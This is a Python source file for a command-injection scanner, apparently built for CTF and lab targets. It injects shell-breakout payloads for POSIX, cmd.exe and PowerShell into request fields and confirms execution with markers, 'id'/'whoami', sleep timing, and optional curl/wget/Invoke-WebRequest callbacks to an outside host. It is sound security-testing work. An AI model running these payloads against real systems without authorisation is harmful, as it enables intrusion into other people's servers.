#!/usr/bin/env python3
"""cmdiquick.py — bounded, dialect-aware OS command-injection detector.

Start from one known-valid request and one explicit injection location. Supported
locations are URL query parameters, URL-encoded form fields, nested JSON fields,
path markers, headers, cookies, raw bodies, and a marker inside a raw HTTP request.
Raw modes cover multipart bodies, unusual encodings, and filenames.

The default chain is response-only and non-destructive. It identifies POSIX,
cmd.exe, and PowerShell contexts with reflection-controlled random markers across
common separators, newlines, and quote breakouts, then reuses the exact winning
wrapper for ``whoami``. Paired time and verified OOB testing are explicit options.

Exit codes: 0 confirmed injection or flag, 2 inconclusive/rate limited/budget,
3 gateway or request failure, 4 invalid arguments.
"""
import argparse
import copy
from dataclasses import dataclass
import json
import os
from pathlib import Path
import random
import re
import string
import sys
import time
from urllib.parse import parse_qsl, quote, urlencode, urljoin, urlsplit, urlunsplit

import requests

requests.packages.urllib3.disable_warnings()

UA = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
      "(KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36")
FLAG_RE = re.compile(
    r'(?<![A-Za-z0-9])(?:HTB|bug|flag|CTF|THM|PLab|picoCTF|RM|WEBVERSE)\{[^}]{3,120}\}', re.I)
ID_RE = re.compile(r'\buid=\d+\([^)]+\)\s+gid=\d+\([^)]+\)', re.I)
SHELL_ERROR_RE = re.compile(
    r'(?:^|[\r\n"\'])\s*(?:/bin/)?(?:ba|da|a|z|k)?sh:\s|command not found|'
    r'not recognized as an internal or external command|syntax error near unexpected token|'
    r'was unexpected at this time|the syntax of the command is incorrect|'
    r'CommandNotFoundException|FullyQualifiedErrorId|ParserError|'
    r'The term .+ is not recognized as the name of', re.I)
GATEWAY_FAILURES = {502, 503, 504}
SENSITIVE_HEADERS = {"authorization", "cookie", "proxy-authorization", "x-api-key"}


class FoundFlag(RuntimeError):
    pass


class Inconclusive(RuntimeError):
    pass


class CircuitBreak(RuntimeError):
    pass


class BudgetExhausted(RuntimeError):
    pass


def unique(items):
    return list(dict.fromkeys(item for item in items if item))


@dataclass(frozen=True)
class InjectionTemplate:
    """One shell dialect plus one syntactic way to reach a second command."""

    dialect: str
    label: str
    prefix: str
    suffix: str = ""
    response_visible: bool = True

    def render(self, seed, command):
        return seed + self.prefix + command + self.suffix


DIALECT_MARKERS = {
    "posix": lambda nonce: "printf %s " + nonce,
    "windows": lambda nonce: "echo " + nonce,
    "powershell": lambda nonce: "Write-Output " + nonce,
}


def injection_templates(os_name):
    """Return cheap dialect discriminators first, then context breakouts."""
    enabled = ("posix", "windows", "powershell") if os_name == "auto" else (os_name,)
    core = {
        "posix": InjectionTemplate("posix", "posix-semicolon", ";"),
        # ``ver`` is a cmd.exe builtin. Requiring it prevents POSIX ``&echo``
        # semantics from being misclassified as Windows.
        "windows": InjectionTemplate("windows", "windows-ampersand", "&ver>nul&&"),
        "powershell": InjectionTemplate(
            "powershell", "powershell-semicolon", ";if($PSVersionTable){", "}"),
    }
    templates = [core[name] for name in enabled]
    expanded = {
        "posix": [
            InjectionTemplate("posix", "posix-and", "&&"),
            InjectionTemplate("posix", "posix-or", "||"),
            InjectionTemplate("posix", "posix-pipe", "|"),
            InjectionTemplate("posix", "posix-newline", "\n"),
            InjectionTemplate("posix", "posix-single-quote", "';", ";#"),
            InjectionTemplate("posix", "posix-double-quote", '\";', ";#"),
            InjectionTemplate(
                "posix", "posix-dollar-substitution", "$(", ")", False),
            InjectionTemplate(
                "posix", "posix-backtick-substitution", "`", "`", False),
        ],
        "windows": [
            InjectionTemplate("windows", "windows-and", "&&ver>nul&&"),
            InjectionTemplate("windows", "windows-or", "||ver>nul&&"),
            InjectionTemplate("windows", "windows-pipe", "|ver>nul&&"),
            InjectionTemplate("windows", "windows-newline", "\r\nver>nul&&"),
            InjectionTemplate("windows", "windows-double-quote", '\"&ver>nul&&', "&rem "),
        ],
        "powershell": [
            InjectionTemplate(
                "powershell", "powershell-newline", "\nif($PSVersionTable){", "}"),
            InjectionTemplate(
                "powershell", "powershell-single-quote", "';if($PSVersionTable){", "};#"),
            InjectionTemplate(
                "powershell", "powershell-double-quote", '\";if($PSVersionTable){', "};#"),
            InjectionTemplate(
                "powershell", "powershell-subexpression", "$(", ")", False),
        ],
    }
    for name in enabled:
        templates.extend(expanded[name])
    return templates


def mutate_occurrence(pairs, key_name, occurrence, value):
    seen = 0
    output = []
    for key, old in pairs:
        if key == key_name:
            seen += 1
            if seen == occurrence:
                old = value
        output.append((key, old))
    return output


def parse_header(item):
    if ":" not in item:
        raise ValueError("--header must be 'Name: Value': %s" % item)
    key, value = item.split(":", 1)
    key = key.strip()
    if not key:
        raise ValueError("empty header name")
    return key, value.strip()


def field_parts(path):
    """Parse ``a.b[0].c`` and ``a.0.c`` into dictionary/list traversal parts."""
    if not path or path.startswith(".") or path.endswith("."):
        raise ValueError("invalid field path: %s" % path)
    parts = []
    for token in path.split("."):
        if not token:
            raise ValueError("invalid field path: %s" % path)
        cursor = 0
        head = re.match(r'[^\[\]]+', token)
        if head:
            value = head.group(0)
            parts.append(int(value) if value.isdigit() else value)
            cursor = head.end()
        while cursor < len(token):
            match = re.match(r'\[(\d+)\]', token[cursor:])
            if not match:
                raise ValueError("invalid field path: %s" % path)
            parts.append(int(match.group(1)))
            cursor += match.end()
    return parts


def nested_get(data, parts):
    current = data
    for part in parts:
        if isinstance(part, int):
            if not isinstance(current, list) or part >= len(current):
                raise ValueError("JSON field path does not exist")
        elif not isinstance(current, dict) or part not in current:
            raise ValueError("JSON field path does not exist")
        current = current[part]
    return current


def nested_set(data, parts, value):
    current = data
    for part in parts[:-1]:
        current = current[part]
    current[parts[-1]] = value


def response_scan(response):
    return (response.text or "") + "\n" + "\n".join(
        "%s: %s" % item for item in response.headers.items())


def redacted_headers(headers):
    return {key: ("<redacted>" if key.lower() in SENSITIVE_HEADERS else value)
            for key, value in headers.items()}


class RequestTemplate:
    def __init__(self, args):
        self.args = args
        self.base_headers = {
            "User-Agent": UA,
            "Accept": "application/json, text/plain, */*",
        }
        if args.token:
            self.base_headers["Authorization"] = "Bearer " + args.token
        if args.cookie:
            self.base_headers["Cookie"] = args.cookie
        for item in args.header:
            key, value = parse_header(item)
            self.base_headers[key] = value

        selectors = [bool(args.param), bool(args.field), bool(args.path_marker),
                     bool(args.inject_header), bool(args.cookie_param),
                     bool(args.request_file), bool(args.body_file)]
        if sum(selectors) != 1:
            raise ValueError(
                "choose exactly one target: --param, --field, --path-marker, "
                "--inject-header, --cookie-param, --request-file, or --body-file")

        body_modes = [args.json_data is not None, args.form is not None]
        if sum(body_modes) > 1:
            raise ValueError("--json/--data and --form are mutually exclusive")
        if args.field and not any(body_modes):
            raise ValueError("--field requires --json/--data or --form")
        if any(body_modes) and not args.field:
            raise ValueError("body input requires --field")
        if (args.request_file or args.body_file) and any(body_modes):
            raise ValueError(
                "--request-file/--body-file cannot be combined with --json/--data or --form")

        self.mode = None
        self.seed = args.seed
        self.location = ""
        self.json_data = None
        self.form_pairs = None
        self.json_parts = None
        self.raw_text = None
        self.body_text = None
        self.cookie_pairs = None
        self.raw_marker_in_head = False

        if args.request_file:
            self.mode = "raw"
            if not args.marker or args.seed is None:
                raise ValueError("--request-file requires --marker and --seed")
            self.raw_text = Path(args.request_file).read_bytes().decode("latin-1")
            if self.raw_text.count(args.marker) != 1:
                raise ValueError("raw request marker must occur exactly once")
            raw_head = self.raw_text.partition("\r\n\r\n")[0]
            if "\r\n\r\n" not in self.raw_text:
                raw_head = self.raw_text.partition("\n\n")[0]
            self.raw_marker_in_head = args.marker in raw_head
            self.location = "raw:%s" % args.marker
        elif args.body_file:
            self.mode = "body"
            if not args.marker or args.seed is None:
                raise ValueError("--body-file requires --marker and --seed")
            self.body_text = Path(args.body_file).read_bytes().decode("latin-1")
            if self.body_text.count(args.marker) != 1:
                raise ValueError("body marker must occur exactly once")
            self.location = "body:%s" % args.marker
        elif args.param:
            self.mode = "query"
            parsed = urlsplit(args.url)
            pairs = parse_qsl(parsed.query, keep_blank_values=True)
            matches = [value for key, value in pairs if key == args.param]
            if not 1 <= args.occurrence <= len(matches):
                raise ValueError("--param occurrence does not exist")
            self.seed = matches[args.occurrence - 1]
            self.location = "query:%s%s" % (
                args.param, "[%d]" % args.occurrence if args.occurrence != 1 else "")
        elif args.path_marker:
            self.mode = "path"
            if args.url.count(args.path_marker) != 1 or args.seed is None:
                raise ValueError("--path-marker must occur once in --url and requires --seed")
            self.location = "path:%s" % args.path_marker
        elif args.inject_header:
            self.mode = "header"
            matches = [(key, value) for key, value in self.base_headers.items()
                       if key.lower() == args.inject_header.lower()]
            if len(matches) != 1:
                raise ValueError("--inject-header must name one existing --header")
            self.header_key, self.seed = matches[0]
            self.location = "header:%s" % self.header_key
        elif args.cookie_param:
            self.mode = "cookie"
            if not args.cookie:
                raise ValueError("--cookie-param requires --cookie")
            self.cookie_pairs = []
            for item in args.cookie.split(";"):
                if "=" not in item:
                    continue
                key, value = item.split("=", 1)
                self.cookie_pairs.append((key.strip(), value.strip()))
            matches = [value for key, value in self.cookie_pairs if key == args.cookie_param]
            if not 1 <= args.occurrence <= len(matches):
                raise ValueError("--cookie-param occurrence does not exist")
            self.seed = matches[args.occurrence - 1]
            self.location = "cookie:%s%s" % (
                args.cookie_param,
                "[%d]" % args.occurrence if args.occurrence != 1 else "")
        elif args.json_data is not None:
            self.mode = "json"
            self.json_data = json.loads(args.json_data)
            if not isinstance(self.json_data, (dict, list)):
                raise ValueError("--json/--data must decode to an object or array")
            self.json_parts = field_parts(args.field)
            self.seed = nested_get(self.json_data, self.json_parts)
            self.location = "json:%s" % args.field
        elif args.form is not None:
            self.mode = "form"
            self.form_pairs = parse_qsl(args.form, keep_blank_values=True)
            matches = [value for key, value in self.form_pairs if key == args.field]
            if not 1 <= args.occurrence <= len(matches):
                raise ValueError("--field occurrence does not exist in form body")
            self.seed = matches[args.occurrence - 1]
            self.location = "form:%s%s" % (
                args.field, "[%d]" % args.occurrence if args.occurrence != 1 else "")

        if not isinstance(self.seed, str):
            raise ValueError("the selected baseline value must be a string")

    def _raw_request(self, value):
        rendered = self.raw_text.replace(self.args.marker, value)
        head, separator, body = rendered.partition("\r\n\r\n")
        if not separator:
            head, separator, body = rendered.partition("\n\n")
        lines = head.replace("\r\n", "\n").split("\n")
        request_line = lines.pop(0).split()
        if len(request_line) < 2:
            raise ValueError("invalid raw request line")
        method, target = request_line[:2]
        url = target if target.startswith(("http://", "https://")) else urljoin(self.args.url, target)
        headers = {}
        for line in lines:
            if not line:
                continue
            key, header_value = parse_header(line)
            if key.lower() not in ("host", "content-length", "transfer-encoding"):
                headers[key] = header_value
        headers.update(self.base_headers)
        return method.upper(), url, headers, {"data": body.encode("latin-1")}

    def build(self, value):
        headers = dict(self.base_headers)
        method = self.args.method
        url = self.args.url
        kwargs = {}
        if self.mode == "raw":
            method, url, headers, kwargs = self._raw_request(value)
        elif self.mode == "body":
            body = self.body_text.replace(self.args.marker, value)
            if self.args.content_type:
                headers.setdefault("Content-Type", self.args.content_type)
            kwargs["data"] = body.encode("latin-1")
        elif self.mode == "query":
            parsed = urlsplit(url)
            pairs = parse_qsl(parsed.query, keep_blank_values=True)
            pairs = mutate_occurrence(
                pairs, self.args.param, self.args.occurrence, value)
            url = urlunsplit((parsed.scheme, parsed.netloc, parsed.path,
                              urlencode(pairs, doseq=True), parsed.fragment))
        elif self.mode == "path":
            encoded = quote(value, safe=";&|$(),'\"")
            url = url.replace(self.args.path_marker, encoded)
        elif self.mode == "header":
            headers[self.header_key] = value
        elif self.mode == "cookie":
            pairs = mutate_occurrence(
                self.cookie_pairs, self.args.cookie_param, self.args.occurrence, value)
            headers["Cookie"] = "; ".join("%s=%s" % item for item in pairs)
        elif self.mode == "json":
            payload = copy.deepcopy(self.json_data)
            nested_set(payload, self.json_parts, value)
            headers.setdefault("Content-Type", "application/json")
            kwargs["json"] = payload
        elif self.mode == "form":
            pairs = mutate_occurrence(
                self.form_pairs, self.args.field, self.args.occurrence, value)
            headers.setdefault("Content-Type", "application/x-www-form-urlencoded")
            kwargs["data"] = pairs
        return method, url, headers, kwargs


class CommandInjectionFastTrack:
    def __init__(self, args, template):
        self.args = args
        self.template = template
        self.session = requests.Session()
        self.count = 0
        self.confirmed = False
        self.possible_shell_error = False
        self.blocked_statuses = []
        self.winning_template = None
        os.makedirs(args.out, exist_ok=True)
        self.response_dir = os.path.join(args.out, "responses")
        os.makedirs(self.response_dir, exist_ok=True)
        self.log_path = os.path.join(args.out, "probes.jsonl")

    def candidates(self, os_name=None, response_visible=None):
        candidates = injection_templates(os_name or self.args.os)
        if self.template.mode in ("header", "cookie") or self.template.raw_marker_in_head:
            candidates = [item for item in candidates if "newline" not in item.label]
        if response_visible is not None:
            candidates = [item for item in candidates
                          if item.response_visible == response_visible]
        return candidates

    def write_summary(self, status, detail=""):
        summary = {
            "status": status,
            "detail": detail,
            "location": self.template.location,
            "probes": self.count,
            "dialect": self.winning_template.dialect if self.winning_template else None,
            "wrapper": self.winning_template.label if self.winning_template else None,
            "evidence": os.path.basename(self.log_path),
        }
        Path(os.path.join(self.args.out, "summary.json")).write_text(
            json.dumps(summary, indent=2, sort_keys=True) + "\n", encoding="utf-8")

    def _record(self, label, value, request, response=None, error=None, elapsed=None,
                flag_hits=None, dialect=None, wrapper=None):
        method, url, headers, kwargs = request
        body = kwargs.get("json", kwargs.get("data"))
        if isinstance(body, bytes):
            body = body.decode("latin-1", "replace")
        record = {
            "label": label,
            "location": self.template.location,
            "mutation": value,
            "dialect": dialect,
            "wrapper": wrapper,
            "request": {
                "method": method, "url": url,
                "headers": redacted_headers(headers), "body": body,
            },
        }
        if error is not None:
            record["error"] = repr(error)
        else:
            safe_label = re.sub(r'[^A-Za-z0-9_.-]+', '-', label).strip("-") or "probe"
            stem = "%02d-%s" % (self.count, safe_label)
            body_path = os.path.join(self.response_dir, stem + ".body")
            headers_path = os.path.join(self.response_dir, stem + ".headers")
            Path(body_path).write_bytes(response.content)
            Path(headers_path).write_text(
                "HTTP %d\n%s\n" % (
                    response.status_code,
                    "\n".join("%s: %s" % item
                              for item in redacted_headers(response.headers).items())),
                encoding="utf-8")
            record.update({
                "status": response.status_code,
                "elapsed": elapsed,
                "flag_hits": flag_hits or [],
                "response_headers": redacted_headers(response.headers),
                "response_body": (response.text or "")[:8000],
                "response_body_file": os.path.relpath(body_path, self.args.out),
                "response_headers_file": os.path.relpath(headers_path, self.args.out),
            })
        with open(self.log_path, "a", encoding="utf-8") as fh:
            fh.write(json.dumps(record, sort_keys=True) + "\n")

    def send(self, label, value, candidate=None):
        if self.count >= self.args.max_probes:
            raise BudgetExhausted("probe budget reached (%d)" % self.args.max_probes)
        if self.count:
            time.sleep(self.args.delay)
        self.count += 1
        request = self.template.build(value)
        method, url, headers, kwargs = request
        started = time.monotonic()
        try:
            response = self.session.request(
                method, url, headers=headers, timeout=self.args.timeout,
                allow_redirects=False, verify=self.args.verify_tls,
                proxies={"http": self.args.proxy, "https": self.args.proxy}
                if self.args.proxy else None, **kwargs)
        except requests.RequestException as exc:
            elapsed = time.monotonic() - started
            self._record(
                label, value, request, error=exc, elapsed=elapsed,
                dialect=candidate.dialect if candidate else None,
                wrapper=candidate.label if candidate else None)
            raise CircuitBreak("request failed during %s: %s" % (label, exc))
        elapsed = time.monotonic() - started
        scan = response_scan(response)
        hits = unique(FLAG_RE.findall(scan))
        self._record(
            label, value, request, response=response, elapsed=elapsed, flag_hits=hits,
            dialect=candidate.dialect if candidate else None,
            wrapper=candidate.label if candidate else None)
        print("[%02d/%02d] %-24s HTTP %d %db %.3fs" % (
            self.count, self.args.max_probes, label,
            response.status_code, len(response.content), elapsed))
        if hits:
            if candidate is not None:
                self.confirmed = True
                self.winning_template = candidate
            for hit in hits:
                print("FLAG %s" % hit)
            raise FoundFlag()
        if response.status_code == 429:
            raise Inconclusive("429 rate limit during %s" % label)
        if response.status_code in GATEWAY_FAILURES:
            raise CircuitBreak("%s returned HTTP %d" % (label, response.status_code))
        if label != "baseline" and response.status_code in (401, 403, 406):
            self.blocked_statuses.append(response.status_code)
        return response, elapsed

    def identity_proof(self, label, candidate, baseline_scan):
        payload = candidate.render(self.template.seed, "id")
        response, _ = self.send(label, payload, candidate=candidate)
        scan = response_scan(response)
        if ID_RE.search(scan) and not ID_RE.search(baseline_scan):
            self.confirmed = True
            self.winning_template = candidate
            print("INJECTABLE %s via %s (new uid/gid output)" % (
                self.template.location, label))
            return True
        if SHELL_ERROR_RE.search(scan) and not SHELL_ERROR_RE.search(baseline_scan):
            self.possible_shell_error = True
            print("[?] new shell/process error during %s" % label)
        return False

    def marker_proof(self, baseline_scan):
        nonce = "CMDIQ_" + "".join(random.choice(string.ascii_uppercase + string.digits)
                                    for _ in range(12))
        literal = self.template.seed + nonce
        literal_response, _ = self.send("reflection-control", literal)
        literal_scan = response_scan(literal_response)
        for candidate in self.candidates(response_visible=True):
            label = candidate.label + "-marker"
            command = DIALECT_MARKERS[candidate.dialect](nonce)
            payload = candidate.render(self.template.seed, command)
            response, _ = self.send(label, payload, candidate=candidate)
            scan = response_scan(response)
            if nonce in scan and nonce not in baseline_scan and nonce not in literal_scan:
                self.confirmed = True
                self.winning_template = candidate
                print("INJECTABLE %s via %s (execution-only marker)" % (
                    self.template.location, label))
                return candidate
            if SHELL_ERROR_RE.search(scan) and not SHELL_ERROR_RE.search(baseline_scan):
                self.possible_shell_error = True
        return None

    def blind_time_proof(self):
        seconds = self.args.blind_time
        controls = []
        for index in range(2):
            _, elapsed = self.send("timing-control-%d" % (index + 1), self.template.seed)
            controls.append(elapsed)
        commands = {
            "posix": "sleep %d" % seconds,
            "windows": ("timeout /t %d /nobreak >nul||ping -n %d 127.0.0.1 >nul"
                        % (seconds, seconds + 1)),
            "powershell": "Start-Sleep -Seconds %d" % seconds,
        }
        threshold = max(controls) + seconds * 0.65
        best_margin = float("-inf")
        for candidate in self.candidates():
            payload = candidate.render(self.template.seed, commands[candidate.dialect])
            _, first = self.send(
                candidate.label + "-timing-1", payload, candidate=candidate)
            best_margin = max(best_margin, first - max(controls))
            if first < threshold:
                continue
            _, second = self.send(
                candidate.label + "-timing-2", payload, candidate=candidate)
            margin = min(first, second) - max(controls)
            best_margin = max(best_margin, margin)
            if margin >= seconds * 0.65:
                self.confirmed = True
                self.winning_template = candidate
                print("INJECTABLE %s via %s paired timing differential %.3fs" % (
                    self.template.location, candidate.label, margin))
                return candidate
        print("[-] no repeatable timing differential (best margin %.3fs)" % best_margin)
        return None

    def oob_proof(self):
        candidates = self.candidates()
        issued = []
        for candidate in candidates:
            nonce = "CMDIQ_" + "".join(
                random.choice(string.ascii_uppercase + string.digits) for _ in range(12))
            callback = self.args.oob_url.rstrip("/") + "/" + nonce
            if candidate.dialect == "posix":
                command = ("curl -fsS %s >/dev/null 2>&1||"
                           "wget -qO- %s >/dev/null 2>&1" % (callback, callback))
            elif candidate.dialect == "windows":
                command = "curl.exe -fsS %s >nul 2>&1" % callback
            else:
                command = ("Invoke-WebRequest -UseBasicParsing -Uri '%s'|Out-Null"
                           % callback)
            payload = candidate.render(self.template.seed, command)
            self.send(candidate.label + "-oob", payload, candidate=candidate)
            issued.append((nonce, candidate))
            if self._oob_hit(nonce):
                return self._confirm_oob(nonce, candidate)

        deadline = time.monotonic() + self.args.oob_wait
        while time.monotonic() < deadline:
            for nonce, candidate in issued:
                if self._oob_hit(nonce):
                    return self._confirm_oob(nonce, candidate)
            time.sleep(0.25)
        print("[-] no nonce observed in OOB log within %.1fs" % self.args.oob_wait)
        return None

    def _oob_hit(self, nonce):
        try:
            return nonce in Path(self.args.oob_log).read_text(
                encoding="utf-8", errors="replace")
        except OSError:
            return False

    def _confirm_oob(self, nonce, candidate):
        self.confirmed = True
        self.winning_template = candidate
        print("INJECTABLE %s via %s verified OOB callback %s" % (
            self.template.location, candidate.label, nonce))
        return candidate

    def follow_up(self, candidate):
        self.send(
            candidate.dialect + "-whoami",
            candidate.render(self.template.seed, "whoami"), candidate=candidate)

    def run(self):
        baseline, _ = self.send("baseline", self.template.seed)
        allowed = (baseline.status_code in self.args.baseline_status
                   if self.args.baseline_status else 200 <= baseline.status_code < 300)
        if not allowed:
            raise Inconclusive(
                "known-valid baseline did not succeed (HTTP %d); fix the request before probing"
                % baseline.status_code)
        baseline_scan = response_scan(baseline)
        if self.args.baseline_regex and not re.search(
                self.args.baseline_regex, baseline_scan, re.I | re.S):
            raise Inconclusive("known-valid baseline did not match --baseline-regex")

        if self.args.os in ("auto", "posix"):
            candidate = self.candidates("posix")[0]
            if self.identity_proof("posix-id", candidate, baseline_scan):
                self.follow_up(candidate)
                return

        candidate = self.marker_proof(baseline_scan)
        if candidate:
            self.follow_up(candidate)
            return

        if self.args.blind_time:
            candidate = self.blind_time_proof()
            if candidate:
                self.follow_up(candidate)
                return

        if self.args.oob_url:
            candidate = self.oob_proof()
            if candidate:
                self.follow_up(candidate)
                return

        detail = "; new shell/process errors were observed" if self.possible_shell_error else ""
        if self.blocked_statuses:
            detail += "; payloads were blocked/filtered with %s" % ",".join(
                str(code) for code in sorted(set(self.blocked_statuses)))
        raise Inconclusive("no strong command-execution differential%s" % detail)


def parse_args(argv=None):
    parser = argparse.ArgumentParser(
        description="Probe one explicit request location for OS command injection")
    parser.add_argument("--url", required=True,
                        help="endpoint URL, or origin URL with --request-file")
    parser.add_argument("--method",
                        help="request method; inferred as POST for body modes, otherwise GET")
    body = parser.add_mutually_exclusive_group()
    body.add_argument("--json", "--data", dest="json_data",
                      help="known-valid JSON request body")
    body.add_argument("--form", help="known-valid application/x-www-form-urlencoded body")
    parser.add_argument("--field", help="JSON path or form field to mutate")
    parser.add_argument("--param", help="existing URL query parameter to mutate")
    parser.add_argument("--occurrence", type=int, default=1,
                        help="1-based occurrence for duplicate query/form/cookie names")
    parser.add_argument("--path-marker", help="single marker in --url to replace")
    parser.add_argument("--inject-header", help="existing --header name to mutate")
    parser.add_argument("--cookie-param", help="cookie name inside --cookie to mutate")
    parser.add_argument("--request-file", help="raw HTTP request containing --marker once")
    parser.add_argument("--body-file", help="raw request body containing --marker once")
    parser.add_argument("--content-type", help="Content-Type for --body-file")
    parser.add_argument("--marker", help="raw-request marker replaced by each value")
    parser.add_argument("--seed", help="valid baseline for path/raw marker modes")
    parser.add_argument("--token", help="Bearer token")
    parser.add_argument("--cookie", help="Cookie header value")
    parser.add_argument("--header", action="append", default=[], help="extra 'Name: Value' header")
    parser.add_argument("--os", choices=("auto", "posix", "windows", "powershell"),
                        default="auto")
    parser.add_argument("--blind-time", type=int, metavar="SECONDS",
                        help="explicit paired time-delay probe; recommended value 2-5")
    parser.add_argument("--oob-url",
                        help="explicit HTTP(S) callback base; requires --oob-log")
    parser.add_argument("--oob-log",
                        help="local collector log searched for per-probe callback nonces")
    parser.add_argument("--oob-wait", type=float, default=10.0,
                        help="seconds to poll --oob-log after callback probes")
    parser.add_argument("--baseline-status", action="append", type=int, default=[],
                        help="allow an exact known-valid baseline status; repeatable")
    parser.add_argument("--baseline-regex",
                        help="regex that the known-valid baseline headers/body must match")
    parser.add_argument("--proxy", help="HTTP(S) proxy URL, for example http://127.0.0.1:8080")
    parser.add_argument("--verify-tls", action="store_true",
                        help="verify the target TLS certificate (disabled by default for labs)")
    parser.add_argument("--out", default="recon/cmdiquick", help="evidence directory")
    parser.add_argument("--max-probes", type=int,
                        help="request budget (default 24, 48 with timing, 64 with timing+OOB)")
    parser.add_argument("--delay", type=float, default=0.15)
    parser.add_argument("--timeout", type=float, default=10.0)
    args = parser.parse_args(argv)
    if args.method is None:
        args.method = "POST" if (args.json_data is not None or args.form is not None
                                  or args.body_file) else "GET"
    args.method = args.method.upper()
    if not re.fullmatch(r'[A-Z]+', args.method):
        parser.error("--method must contain letters only")
    if args.max_probes is None:
        if args.blind_time and args.oob_url:
            args.max_probes = 64
        elif args.blind_time or args.oob_url:
            args.max_probes = 48
        else:
            args.max_probes = 24
    return args


def main(argv=None):
    runner = None
    try:
        args = parse_args(argv)
        if args.max_probes < 1:
            raise ValueError("--max-probes must be positive")
        if args.occurrence < 1:
            raise ValueError("--occurrence must be positive")
        if args.delay < 0 or args.timeout <= 0:
            raise ValueError("--delay must be non-negative and --timeout positive")
        if args.blind_time is not None and not 1 <= args.blind_time <= 10:
            raise ValueError("--blind-time must be between 1 and 10 seconds")
        if args.oob_url and not args.oob_log:
            raise ValueError("--oob-url requires --oob-log")
        if args.oob_log and not args.oob_url:
            raise ValueError("--oob-log requires --oob-url")
        if args.oob_url and (not re.fullmatch(r'https?://[^\s\'\"]+', args.oob_url)
                             or any(char in args.oob_url for char in ";&|`$")):
            raise ValueError("--oob-url must be a simple HTTP(S) URL without shell metacharacters")
        if args.oob_wait < 0 or args.oob_wait > 60:
            raise ValueError("--oob-wait must be between 0 and 60 seconds")
        if any(status < 100 or status > 599 for status in args.baseline_status):
            raise ValueError("--baseline-status must be between 100 and 599")
        if args.baseline_regex:
            re.compile(args.baseline_regex)
        template = RequestTemplate(args)
        runner = CommandInjectionFastTrack(args, template)
        runner.run()
        runner.write_summary("CONFIRMED")
        print("[*] confirmed after %d probe(s); evidence: %s" % (
            runner.count, runner.log_path))
        return 0
    except FoundFlag:
        if runner:
            runner.write_summary("CONFIRMED" if runner.confirmed else "FLAG")
        print("[*] stopped on flag after %d probe(s); evidence: %s" % (
            runner.count, runner.log_path))
        return 0
    except (Inconclusive, BudgetExhausted) as exc:
        count = runner.count if runner else 0
        evidence = runner.log_path if runner else "not created"
        if runner:
            if isinstance(exc, BudgetExhausted):
                status = "UNTESTED_BUDGET"
            elif runner.blocked_statuses:
                status = "BLOCKED_OR_FILTERED"
            else:
                status = "INCONCLUSIVE"
            runner.write_summary(status, str(exc))
        print("[!] INCONCLUSIVE after %d probe(s): %s; evidence: %s" % (
            count, exc, evidence))
        return 2
    except CircuitBreak as exc:
        count = runner.count if runner else 0
        evidence = runner.log_path if runner else "not created"
        if runner:
            runner.write_summary("CIRCUIT_BREAKER", str(exc))
        print("[!] CIRCUIT BREAKER after %d probe(s): %s; evidence: %s" % (
            count, exc, evidence))
        return 3
    except (OSError, ValueError, TypeError, json.JSONDecodeError, re.error) as exc:
        print("[!] invalid arguments: %s" % exc, file=sys.stderr)
        return 4


if __name__ == "__main__":
    sys.exit(main())
